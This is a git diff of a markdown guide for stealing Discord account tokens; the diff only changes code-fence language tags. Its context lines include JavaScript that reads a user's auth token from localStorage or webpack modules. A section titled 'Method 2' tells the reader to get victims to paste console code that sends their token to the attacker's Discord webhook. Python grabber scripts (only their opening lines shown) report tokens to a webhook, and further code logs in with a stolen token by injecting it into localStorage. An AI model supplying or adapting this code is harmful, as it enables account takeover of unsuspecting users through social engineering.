@@ -65,9 +65,13 @@ After: ![](https://i.imgur.com/zl2sHCk.jpeg)
 
 Alternative codes, follow the same steps as above.
 
-```javascript:document.getElementsByTagName("body")[0].innerHTML = localStorage.token;```
+```{javascript}
+javascript:document.getElementsByTagName("body")[0].innerHTML = localStorage.token;
+```
 
-```Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()```
+```{javascript}
+Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
+```
 
 ### Method 2: Get user to run code and token will be sent to you (JavaScript)
 
@@ -77,7 +81,7 @@ Get user to copy and paste this code into browser console and token will be auto
 
 <summary>Code: </summary>    
     
-```
+```{JavaScript}
 location.reload();
 var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
 var i = document.createElement('iframe');
@@ -103,7 +107,7 @@ Get user to run python code OR exe file and token will be automatically sent bac
 
 <summary>First Python Script (Requires pip installation of some libraries), replace <code>WEBHOOK HERE</code> with your webhook URL : </summary>
 
-```
+```{python}
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from threading import Thread
 import urllib3
@@ -308,7 +312,7 @@ Auth()
 <details>
     <summary>Second Python Script, replace <code>WEBHOOK HERE</code> with your webhook URL : </summary>
 
-```
+```{python}
 import os
 import re
 import json
@@ -430,7 +434,7 @@ The second goal is to login with the token. This can only be done via the Discor
 
 Replace ```PASTE TOKEN HERE``` with the token obtained earlier. Enter this code into the Browser JS Console.
 
-```
+```{javascript}
 function login(token) {
 setInterval(() => {
 document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
@@ -447,7 +451,9 @@ login('PASTE TOKEN HERE')
 
 Replace ```TOKEN``` with the token obtained earlier. Enter this code into the Browser JS Console.
 
-```location.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = "\"TOKEN\""```
+```{javascript}
+location.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = "\"TOKEN\""
+```
 
 ## ATTENTION
 
